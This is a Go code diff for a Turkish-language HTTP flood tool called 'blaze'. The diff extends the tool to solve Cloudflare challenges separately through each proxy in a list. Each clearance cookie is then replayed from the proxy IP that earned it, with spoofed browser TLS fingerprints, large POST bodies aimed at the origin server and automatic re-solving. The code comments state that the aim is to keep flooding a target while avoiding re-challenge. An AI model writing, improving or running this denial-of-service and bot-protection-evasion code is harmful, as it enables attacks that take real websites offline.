@@ -40,10 +40,11 @@ func main() {
 		return
 	}
 	if len(os.Args) < 4 {
-		fmt.Println("kullanim: blaze <url> <sure_sn> <thread> [stream] [method] [proxy|proxy_dosya] [--solve] [--body=BOYUT]")
+		fmt.Println("kullanim: blaze <url> <sure_sn> <thread> [stream] [method] [proxy|proxy_dosya] [--solve|--solve=N] [--body=BOYUT]")
 		fmt.Println()
 		fmt.Println("ornek:    ./blaze https://hedef.com 60 64 32")
 		fmt.Println("ornek:    ./blaze https://hedef.com 60 40 40 GET --solve")
+		fmt.Println("ornek:    ./blaze https://hedef.com 60 40 40 GET proxyler.txt --solve=3   (ilk 3 proxy'nin her birinden ayri clearance; yuk o 3 proxy ile)")
 		fmt.Println("ornek:    ./blaze https://hedef.com 60 40 40 POST --body=16k   (origin'e buyuk paket)")
 		fmt.Println("ornek:    ./blaze fp                        (her profilin canli JA3/JA4/H2'sini tls.peet.ws'ten basar)")
 		os.Exit(1)
@@ -61,6 +62,7 @@ func main() {
 	method := "GET"
 	proxyArg := ""
 	solve := false
+	solveCount := 1
 	bodySize := 0
 
 	posArgs := []string{}
@@ -68,6 +70,9 @@ func main() {
 		switch {
 		case arg == "--solve":
 			solve = true
+		case strings.HasPrefix(arg, "--solve="):
+			solve = true
+			solveCount = mustInt(strings.TrimPrefix(arg, "--solve="), "solve proxy sayisi")
 		case strings.HasPrefix(arg, "--body="):
 			bodySize = mustBytes(strings.TrimPrefix(arg, "--body="))
 		default:
@@ -91,18 +96,28 @@ func main() {
 		method = "POST"
 	}
 
-	var solvedCookies string
-	var solvedUA string
+	var sessions []solvedSession
 	if solve {
 		var err error
-		solvedCookies, solvedUA, err = solveCFChallenge(targetURL)
+		sessions, err = solveSessions(targetURL, proxyArg, solveCount)
 		if err != nil {
 			fmt.Fprintf(os.Stderr, "%shata: challenge cozulemedi: %v%s\n", red, err, reset)
 			os.Exit(1)
 		}
 	}
 
-	run(targetURL, durSec, threads, streams, method, proxyArg, solvedCookies, solvedUA, solve, bodySize)
+	run(targetURL, durSec, threads, streams, method, proxyArg, sessions, solve, bodySize)
+}
+
+// solvedSession is one solved Cloudflare clearance bound to a specific exit IP.
+// cf_clearance is tied to the IP + UA + JA3/JA4 that earned it, so the load must
+// replay each clearance through the SAME proxy that solved it. proxyURL is the
+// canonical proxy URL (with credentials) suitable for WithProxy; empty means the
+// solve ran directly (no proxy / VPS IP).
+type solvedSession struct {
+	proxyURL string
+	cookies  string
+	ua       string
 }
 
 type solverResult struct {
@@ -113,7 +128,89 @@ type solverResult struct {
 	Error     string `json:"error"`
 }
 
-func solveCFChallenge(targetURL string) (cookies string, userAgent string, err error) {
+// solveSessions solves the Cloudflare challenge and returns one session per
+// exit IP we'll load through. cf_clearance is IP-bound, so each session's
+// cookie MUST be replayed through the same proxy that earned it.
+//
+//   - proxy file given: solve through the first n proxies (in parallel), one
+//     session each. Proxies that fail to clear are dropped; at least one must
+//     succeed.
+//   - single proxy URL or no proxy: a single session (n is forced to 1), solved
+//     through that proxy (or directly), matching the IP the load will use.
+func solveSessions(targetURL, proxyArg string, n int) ([]solvedSession, error) {
+	if n < 1 {
+		n = 1
+	}
+
+	// No proxy file: one solve, through the single cmdline proxy if any.
+	if !isProxyFile(proxyArg) {
+		var pu *url.URL
+		if proxyArg != "" {
+			if parsed, e := url.Parse(proxyArg); e == nil {
+				pu = parsed
+			}
+		}
+		cookies, ua, err := solveCFChallengeVia(targetURL, pu)
+		if err != nil {
+			return nil, err
+		}
+		return []solvedSession{{proxyURL: proxyArg, cookies: cookies, ua: ua}}, nil
+	}
+
+	// Proxy file: solve through the first n proxies.
+	pr, err := gofire.NewProxyRotatorFromFile(proxyArg)
+	if err != nil {
+		return nil, fmt.Errorf("proxy dosyasi yuklenemedi: %w", err)
+	}
+	urls := pr.ProxyURLs()
+	if len(urls) == 0 {
+		return nil, fmt.Errorf("proxy dosyasi bos")
+	}
+	if n > len(urls) {
+		n = len(urls)
+	}
+	targets := urls[:n]
+	fmt.Printf("%s%d proxy uzerinden challenge cozuluyor (paralel)...%s\n", gray, n, reset)
+
+	type res struct {
+		s   solvedSession
+		err error
+	}
+	results := make([]res, n)
+	var wg sync.WaitGroup
+	for i := 0; i < n; i++ {
+		wg.Add(1)
+		go func(i int) {
+			defer wg.Done()
+			pu, e := url.Parse(targets[i])
+			if e != nil {
+				results[i] = res{err: e}
+				return
+			}
+			cookies, ua, errSolve := solveCFChallengeVia(targetURL, pu)
+			results[i] = res{s: solvedSession{proxyURL: targets[i], cookies: cookies, ua: ua}, err: errSolve}
+		}(i)
+	}
+	wg.Wait()
+
+	var sessions []solvedSession
+	for i, r := range results {
+		if r.err != nil {
+			fmt.Fprintf(os.Stderr, "%sproxy #%d clearance alinamadi: %v%s\n", red, i+1, r.err, reset)
+			continue
+		}
+		sessions = append(sessions, r.s)
+	}
+	if len(sessions) == 0 {
+		return nil, fmt.Errorf("hicbir proxy icin clearance alinamadi (%d denendi)", n)
+	}
+	fmt.Printf("%s%d/%d proxy icin clearance alindi%s\n", white, len(sessions), n, reset)
+	return sessions, nil
+}
+
+// solveCFChallengeVia solves the challenge, routing the headless Chromium
+// through proxyURL when non-nil. cf_clearance is then bound to that proxy's IP.
+func solveCFChallengeVia(targetURL string, proxyURL *url.URL) (cookies string, userAgent string, err error) {
 	fmt.Printf("cloudflare challenge cozuluyor...\n")
 
 	solverPath := findSolver()
@@ -131,6 +228,26 @@ func solveCFChallenge(targetURL string) (cookies string, userAgent string, err e
 
 	cmd := exec.CommandContext(ctx, "node", solverPath, targetURL, "75")
 	cmd.Stderr = os.Stderr
+	// Route the solver's Chromium through the proxy so cf_clearance is bound to
+	// the same exit IP the load will replay it from. Chrome's --proxy-server
+	// rejects embedded credentials, so the scheme://host:port goes in
+	// SOLVER_PROXY and any user:pass goes in SOLVER_PROXY_USER/PASS (the solver
+	// applies them via CDP page.authenticate).
+	if proxyURL != nil && proxyURL.Host != "" {
+		env := os.Environ()
+		scheme := proxyURL.Scheme
+		if scheme == "" {
+			scheme = "http"
+		}
+		env = append(env, "SOLVER_PROXY="+scheme+"://"+proxyURL.Host)
+		if proxyURL.User != nil {
+			env = append(env, "SOLVER_PROXY_USER="+proxyURL.User.Username())
+			if pw, ok := proxyURL.User.Password(); ok {
+				env = append(env, "SOLVER_PROXY_PASS="+pw)
+			}
+		}
+		cmd.Env = env
+	}
 	// Put node + every chromium child in their own process group so we can
 	// kill the WHOLE tree on timeout. Without Setpgid, exec.CommandContext
 	// only kills the immediate node process - chromium children survive as
@@ -277,6 +394,7 @@ func findSolver() string {
 type clientGroup struct {
 	name      string
 	tag       string // Ch, FF, SF
+	proxyURL  string // proxy this group's clearance is bound to ("" = direct); used by auto-refresh
 	clients   []*gofire.Client
 	pipelines []*gofire.Pipeline
 	templates []*http.Request
@@ -368,7 +486,7 @@ func formatTestResult(tag string, statusCode int, err error) string {
 	return fmt.Sprintf("%sImpersonate %s %s>%s %s%d%s", white, label, gray, reset, white, statusCode, reset)
 }
 
-func run(targetURL string, durSec, threads, streams int, method, proxyArg, solvedCookies, solvedUA string, solveEnabled bool, bodySize int) {
+func run(targetURL string, durSec, threads, streams int, method, proxyArg string, sessions []solvedSession, solveEnabled bool, bodySize int) {
 	runtime.GOMAXPROCS(runtime.NumCPU())
 
 	// Pre-build the POST body once. The same buffer is shared (read-only) by
@@ -432,65 +550,109 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 		"firefox": "https://duckduckgo.com/",
 	}
 
-	// Proxy plumbing has two modes:
-	//
-	//   single proxy URL on cmdline -> WithProxy on every client (existing)
-	//   proxy file                  -> one client per proxy, pinned via
-	//                                  WithProxy(<that-proxy>). The shared
-	//                                  rotator approach only rotates at dial
-	//                                  time, so H2 connection reuse meant a
-	//                                  300-entry list often only saw ~5
-	//                                  proxies actively in use. Per-proxy
-	//                                  clients guarantee every entry runs
-	//                                  its own connection pool.
-	var proxyURLs []string
-	if usingProxy {
-		if isProxyFile(proxyArg) {
-			pr, err := gofire.NewProxyRotatorFromFile(proxyArg)
-			if err != nil {
-				fmt.Fprintf(os.Stderr, "%shata: proxy dosyasi yuklenemedi: %v%s\n", red, err, reset)
-				os.Exit(1)
-			}
-			proxyURLs = pr.ProxyURLs()
-			if len(proxyURLs) == 0 {
-				fmt.Fprintf(os.Stderr, "%shata: proxy dosyasi bos%s\n", red, reset)
-				os.Exit(1)
-			}
-		} else {
-			baseOpts = append(baseOpts, gofire.WithProxy(proxyArg))
+	// groups holds the per-"client group" pipelines. workersPerClient and
+	// proxyCount are shared with the banner/feeder setup below, so declare them
+	// before the mode branch.
+	var groups []*clientGroup
+	var workersPerClient int
+	proxyCount := 0
+
+	if len(sessions) > 0 {
+		// --- Solve mode: one cf_clearance per exit IP ----------------------
+		// Each session carries a clearance bound to a specific proxy IP + UA.
+		// We build a group of Chrome clients per session, every client pinned to
+		// that session's proxy and replaying that session's cookie — so the
+		// clearance is always presented from the IP that earned it. Replaying a
+		// single clearance across many different proxy IPs (the old behavior)
+		// got it re-challenged instantly; this keeps cookie↔IP coherent.
+		clientsPerSession := totalTargetClients / len(sessions)
+		if clientsPerSession < 1 {
+			clientsPerSession = 1
 		}
-	}
-
-	var parsedCookies []*http.Cookie
-	if solvedCookies != "" {
-		parsedCookies = parseCookieHeader(solvedCookies)
-	}
-
-	type browserSpec struct {
-		name    string
-		tag     string // Ch, FF, SF
-		profile gofire.BrowserProfile
-		clients int
-	}
-
-	var browsers []browserSpec
-
-	// When a proxy file is in use, the *number of proxies* dictates client
-	// count (one client per proxy). Otherwise fall back to the user-supplied
-	// thread count.
-	clientBudget := totalTargetClients
-	if len(proxyURLs) > 0 {
-		clientBudget = len(proxyURLs)
-	}
-
-	if solvedCookies != "" {
-		browsers = []browserSpec{
-			{"chrome", "Ch", gofire.Chrome148, clientBudget},
+		totalClients := clientsPerSession * len(sessions)
+		workersPerClient = (threads * streams) / totalClients
+		if workersPerClient < 1 {
+			workersPerClient = 1
 		}
-		if solvedUA != "" {
-			baseOpts = append(baseOpts, gofire.WithUserAgent(solvedUA))
+
+		groups = make([]*clientGroup, len(sessions))
+		for si, sess := range sessions {
+			if sess.proxyURL != "" {
+				proxyCount++
+			}
+			cg := &clientGroup{name: "chrome", tag: "Ch", proxyURL: sess.proxyURL}
+			parsed := parseCookieHeader(sess.cookies)
+			for i := 0; i < clientsPerSession; i++ {
+				clientOpts := make([]gofire.Option, 0, len(baseOpts)+3)
+				clientOpts = append(clientOpts, baseOpts...)
+				clientOpts = append(clientOpts, gofire.WithReferer(browserReferers["chrome"]))
+				if sess.ua != "" {
+					clientOpts = append(clientOpts, gofire.WithUserAgent(sess.ua))
+				}
+				if sess.proxyURL != "" {
+					clientOpts = append(clientOpts, gofire.WithProxy(sess.proxyURL))
+				}
+				c, err := gofire.Emulate(gofire.Chrome148, clientOpts...)
+				if err != nil {
+					fmt.Fprintf(os.Stderr, "%shata: client olusturulamadi: %v%s\n", red, err, reset)
+					os.Exit(1)
+				}
+				if len(parsed) > 0 {
+					_ = c.SetCookies(targetURL, parsed)
+				}
+				tmpl, err := c.PrepareRequest(method, targetURL)
+				if err != nil {
+					fmt.Fprintf(os.Stderr, "%shata: template olusturulamadi: %v%s\n", red, err, reset)
+					os.Exit(1)
+				}
+				if sess.cookies != "" {
+					tmpl.Header.Set("Cookie", sess.cookies)
+				}
+				if bodyBytes != nil {
+					attachBody(tmpl, bodyBytes, targetURL)
+				}
+				p := c.NewPipeline(workersPerClient)
+				p.SetTemplate(tmpl)
+				cg.clients = append(cg.clients, c)
+				cg.pipelines = append(cg.pipelines, p)
+				cg.templates = append(cg.templates, tmpl)
+			}
+			groups[si] = cg
 		}
 	} else {
+		// --- Load-only mode: 3 browser profiles, optional proxy file -------
+		//
+		//   single proxy URL on cmdline -> WithProxy on every client
+		//   proxy file                  -> one client per proxy, pinned via
+		//                                  WithProxy. The shared rotator only
+		//                                  rotates at dial time, so H2 conn
+		//                                  reuse meant a 300-entry list often
+		//                                  saw only ~5 proxies; per-proxy
+		//                                  clients exercise every entry.
+		var proxyURLs []string
+		if usingProxy {
+			if isProxyFile(proxyArg) {
+				pr, err := gofire.NewProxyRotatorFromFile(proxyArg)
+				if err != nil {
+					fmt.Fprintf(os.Stderr, "%shata: proxy dosyasi yuklenemedi: %v%s\n", red, err, reset)
+					os.Exit(1)
+				}
+				proxyURLs = pr.ProxyURLs()
+				if len(proxyURLs) == 0 {
+					fmt.Fprintf(os.Stderr, "%shata: proxy dosyasi bos%s\n", red, reset)
+					os.Exit(1)
+				}
+			} else {
+				baseOpts = append(baseOpts, gofire.WithProxy(proxyArg))
+			}
+		}
+		proxyCount = len(proxyURLs)
+
+		clientBudget := totalTargetClients
+		if len(proxyURLs) > 0 {
+			clientBudget = len(proxyURLs)
+		}
+
 		safariClients := clientBudget * 4 / 10
 		chromeClients := clientBudget * 3 / 10
 		firefoxClients := clientBudget - safariClients - chromeClients
@@ -503,65 +665,61 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 		if firefoxClients < 1 {
 			firefoxClients = 1
 		}
-		browsers = []browserSpec{
+		browsers := []struct {
+			name    string
+			tag     string
+			profile gofire.BrowserProfile
+			clients int
+		}{
 			{"firefox", "FF", gofire.Firefox151, firefoxClients},
 			{"chrome", "Ch", gofire.Chrome148, chromeClients},
 			{"safari", "SF", gofire.SafariIOS18, safariClients},
 		}
-	}
 
-	groups := make([]*clientGroup, len(browsers))
-
-	totalClients := 0
-	for _, bs := range browsers {
-		totalClients += bs.clients
-	}
-	workersPerClient := (threads * streams) / totalClients
-	if workersPerClient < 1 {
-		workersPerClient = 1
-	}
-
-	// Walk the proxy list with a global cursor so each client across all
-	// browser groups gets a distinct proxy. With clientBudget == len(proxyURLs)
-	// the assignment is exactly 1:1.
-	proxyIdx := 0
-
-	for bi, bs := range browsers {
-		cg := &clientGroup{name: bs.name, tag: bs.tag}
-		opts := append(baseOpts, gofire.WithReferer(browserReferers[bs.name]))
-
-		for i := 0; i < bs.clients; i++ {
-			clientOpts := opts
-			if len(proxyURLs) > 0 {
-				clientOpts = append(clientOpts, gofire.WithProxy(proxyURLs[proxyIdx%len(proxyURLs)]))
-				proxyIdx++
-			}
-			c, err := gofire.Emulate(bs.profile, clientOpts...)
-			if err != nil {
-				fmt.Fprintf(os.Stderr, "%shata: %s client olusturulamadi: %v%s\n", red, bs.name, err, reset)
-				os.Exit(1)
-			}
-			if len(parsedCookies) > 0 {
-				_ = c.SetCookies(targetURL, parsedCookies)
-			}
-			tmpl, err := c.PrepareRequest(method, targetURL)
-			if err != nil {
-				fmt.Fprintf(os.Stderr, "%shata: template olusturulamadi: %v%s\n", red, err, reset)
-				os.Exit(1)
-			}
-			if solvedCookies != "" {
-				tmpl.Header.Set("Cookie", solvedCookies)
-			}
-			if bodyBytes != nil {
-				attachBody(tmpl, bodyBytes, targetURL)
-			}
-			p := c.NewPipeline(workersPerClient)
-			p.SetTemplate(tmpl)
-			cg.clients = append(cg.clients, c)
-			cg.pipelines = append(cg.pipelines, p)
-			cg.templates = append(cg.templates, tmpl)
+		totalClients := 0
+		for _, bs := range browsers {
+			totalClients += bs.clients
 		}
-		groups[bi] = cg
+		workersPerClient = (threads * streams) / totalClients
+		if workersPerClient < 1 {
+			workersPerClient = 1
+		}
+
+		// Global cursor so each client across browser groups gets a distinct
+		// proxy. With clientBudget == len(proxyURLs) the assignment is 1:1.
+		proxyIdx := 0
+		groups = make([]*clientGroup, len(browsers))
+		for bi, bs := range browsers {
+			cg := &clientGroup{name: bs.name, tag: bs.tag}
+			for i := 0; i < bs.clients; i++ {
+				clientOpts := make([]gofire.Option, 0, len(baseOpts)+2)
+				clientOpts = append(clientOpts, baseOpts...)
+				clientOpts = append(clientOpts, gofire.WithReferer(browserReferers[bs.name]))
+				if len(proxyURLs) > 0 {
+					clientOpts = append(clientOpts, gofire.WithProxy(proxyURLs[proxyIdx%len(proxyURLs)]))
+					proxyIdx++
+				}
+				c, err := gofire.Emulate(bs.profile, clientOpts...)
+				if err != nil {
+					fmt.Fprintf(os.Stderr, "%shata: %s client olusturulamadi: %v%s\n", red, bs.name, err, reset)
+					os.Exit(1)
+				}
+				tmpl, err := c.PrepareRequest(method, targetURL)
+				if err != nil {
+					fmt.Fprintf(os.Stderr, "%shata: template olusturulamadi: %v%s\n", red, err, reset)
+					os.Exit(1)
+				}
+				if bodyBytes != nil {
+					attachBody(tmpl, bodyBytes, targetURL)
+				}
+				p := c.NewPipeline(workersPerClient)
+				p.SetTemplate(tmpl)
+				cg.clients = append(cg.clients, c)
+				cg.pipelines = append(cg.pipelines, p)
+				cg.templates = append(cg.templates, tmpl)
+			}
+			groups[bi] = cg
+		}
 	}
 	defer func() {
 		for _, cg := range groups {
@@ -573,17 +731,17 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 	// len(groups) of N proxies (one per browser group), so a single failed
 	// test line doesn't mean the run will fail — it just means *that one*
 	// proxy is bad. The load test continues with all clients regardless.
-	if len(proxyURLs) > 0 {
+	if proxyCount > 0 {
 		sampled := len(groups)
-		rest := len(proxyURLs) - sampled
+		rest := proxyCount - sampled
 		if rest < 0 {
 			rest = 0
 		}
 		fmt.Printf("%s%d proxy yuklendi (test asagidaki %d proxy'i ornekliyor — geri kalan %d proxy yine de calisir)%s\n",
-			gray, len(proxyURLs), sampled, rest, reset)
+			gray, proxyCount, sampled, rest, reset)
 	}
 	testTimeout := 15 * time.Second
-	if len(proxyURLs) > 0 {
+	if proxyCount > 0 {
 		// Proxies often need 5-10s just for CONNECT; 30s gives a fair test.
 		testTimeout = 30 * time.Second
 	}
@@ -752,12 +910,20 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 						continue
 					}
 
-					newCookies, _, errSolve := solveCFChallenge(targetURL)
-					if errSolve != nil {
-						refreshing.Store(false)
-						continue
-					}
+					// Re-solve each group through its OWN proxy so the fresh
+					// clearance stays bound to the IP that group loads from.
+					// A failure on one group leaves its old cookie in place.
 					for _, cg := range groups {
+						var pu *url.URL
+						if cg.proxyURL != "" {
+							if parsed, e := url.Parse(cg.proxyURL); e == nil {
+								pu = parsed
+							}
+						}
+						newCookies, _, errSolve := solveCFChallengeVia(targetURL, pu)
+						if errSolve != nil {
+							continue
+						}
 						cg.updateCookies(newCookies)
 					}
 					refreshing.Store(false)
